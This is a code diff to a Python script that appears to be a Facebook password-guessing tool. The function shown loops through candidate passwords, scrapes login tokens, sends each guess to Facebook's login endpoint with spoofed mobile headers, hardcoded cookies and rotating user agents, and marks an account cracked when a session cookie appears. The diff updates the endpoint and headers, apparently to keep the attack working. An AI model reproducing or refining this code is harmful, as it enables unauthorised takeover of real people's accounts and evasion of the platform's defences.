@@ -1336,66 +1336,55 @@ def p(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
+            ua = random.choice(ugen)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'api_key': '525265914179580',
-            'cancel_url': 'https://www.canva.com/oauth/authorized/facebook?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=87d312cc-d9a6-4b70-b0ca-864a924a8bda#_=_',
-            'display': 'page',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '1',
-            'signed_next': '1',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '061617_WtAh',
-            'lgnjs': '1732716979',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTczMjcxNjk3OS41NzMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3MzI3MTY5NzkuNTc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ucGhwIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3MzI3MTY5NzkuNTc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ucGhwIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3MzI3MTY5NzkuNTc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ucGhwIn0sInYiOlsiZW4tSU4iLCJlbi1VUyIsImVuLUdCIiwiZW4iLCJoaSIsImd1IiwiYm4iXX1dLCIzMDAwNCI6W3sidCI6MTczMjcxNjk3OS41NzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6MTAwfV0sIjMwMDA1IjpbeyJ0IjoxNzMyNzE2OTc5LjU3NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2Ijp7InciOjYwMCwiaCI6NTQ5fX1dLCIzMDAwNyI6W3sidCI6MTczMjcxNjk3OS41NzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzMyNzE2OTc5LjgyMiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTczMjcxNjk3OS41NzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTczMjcxNjk3OS41NzYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzMyNzE2OTc5LjU3NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzMyNzE2OTc5LjU3NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzMyNzE2OTc5LjY1NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzMyNzE2OTc5LjY1OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzMyNzE2OTc5LjY1OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzMyNzE2OTc5LjY1OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTczMjcxNjk3OS42NTgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6MX1dLCIzMDEwNiI6W3sidCI6MTczMjcxNjk3OS4zMzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6ZmFsc2V9LHsidCI6MTczMjcxNjk3OS41NDgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHAifSwidiI6dHJ1ZX0seyJ0IjoxNzMyNzE2OTc5LjU3MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzMyNzE2OTgyLjA0NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzMyNzE2OTc5LjMzNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLnBocCJ9LCJ2IjpmYWxzZX1dfQ==',
             'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'password',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'true',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZ/lMAAAMBFAG',
+            'login_source': 'comet_headerless_login',
+            'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'datr': 'DQQ-Z3Sl1kkwp5eJPjAonnEo',
-            'sb': 'DQQ-Z2ztbMJmdxyVIlGZ0ZEN',
+            'datr': 'OstGZ9sw-xX6t8x0uWISu5oh',
+            'sb': 'OstGZ0x6Arcou92IF2BALgFQ',
             'ps_l': '1',
             'ps_n': '1',
-            'fr': '0c3x4NhqzBoN0oJpn.AWVfsC_G24y6uAIoOOKvbwXSI3E.BnPBZf..AAA.0.0.BnRymx.AWXuu8K5mwU',
-            'wd': '1440x802',}
+            'locale': 'en_GB',
+            'vpd': 'v1%3B968x491x2.200000047683716',
+            'wl_cbv': 'v2%3Bclient_version%3A2682%3Btimestamp%3A1732715348',
+            'm_pixel_ratio': '2.200000047683716',
+            'dpr': '2.418783187866211',
+            'sfau': 'AYgNkLjGTe1gHr_479HcvZEaK6GxqLaTuMXypBQ9hvnb7qibQ6qn37jS7Pq9wXjWkiXSdgM4LqQHDpkoIqARDRBmywQDcZT_fOxZArEvyUrnjJnvR8xaiNmJjPw6pIU1gPZutIoGD0lgsw3A6xMtD9kNZcQ8cuY7BuqhDlONLkSmnsFFqBmE-ZuMphawGajSEfEzIX4-h6e_fCPk896e3znjqGp-2lJ5n6rZ_jncGUYWR8b7O_-izeB5HGXKYFMRqDWkXYektFKIJmFCnTAWGuew',
+            'sfiu': 'AYhZoZTu_-72dnkHt69iesu1hMPG1AihofIn6wiVKmnKYReQ2TMtUACzmYy9GVwsp7-EKC286ynQMZNBiamaHGqOFuo7Rri-K-43MgQ5KSA4CDfAy-Wv0kWpZNIuz7PLXnAPcGXzTAguMor3PPFBGNzgpykK-TxNaC1tI2fpdXYqKVuXi5a6B4APMstc9IcD3WUu_VSyOj8PyQ5fYSA7APooXp7Iw8VFcEE6wRi9Ui_e3jB9plGLHv8ZfImFSwH49ln4Ba9AvLtk__vStSlYoy9s',
+            'fr': '0bPmdaDqTCILtVoFs.AWWodC7aGrstpwmB8K32LUUAvOY.BnRss6..AAA.0.0.BnRzQ2.AWWIRa5cCcM',
+            'wd': '891x1756',}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D87d312cc-d9a6-4b70-b0ca-864a924a8bda%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df443522a-0861-462d-a090-c0c211d019a0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D87d312cc-d9a6-4b70-b0ca-864a924a8bda%23_%3D_&display=page&locale=bn_IN&pl_dbl=0',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.86", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'viewport-width': '1440',}
+            "Host": "www.facebook.com",
+            "content-length": str(len((data))),
+            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+            "x-response-format": "JSONStream",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "viewport-width": "360",
+            "x-requested-with": "XMLHttpRequest",
+            "x-asbd-id": "129477",
+            "dpr": "2",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua-platform": '"Android"',
+            "accept": "*/*",
+            "origin": "https://www.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.facebook.com/?wtsid=rdr_0iD89ZC5eO1TGcyne&rtime=1714619990&hrc=1&refsrc=deprecated&_rdr",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
+            url = "https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1435,7 +1424,6 @@ def p(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 
 def x(uid,pwx,tl):
     global oks
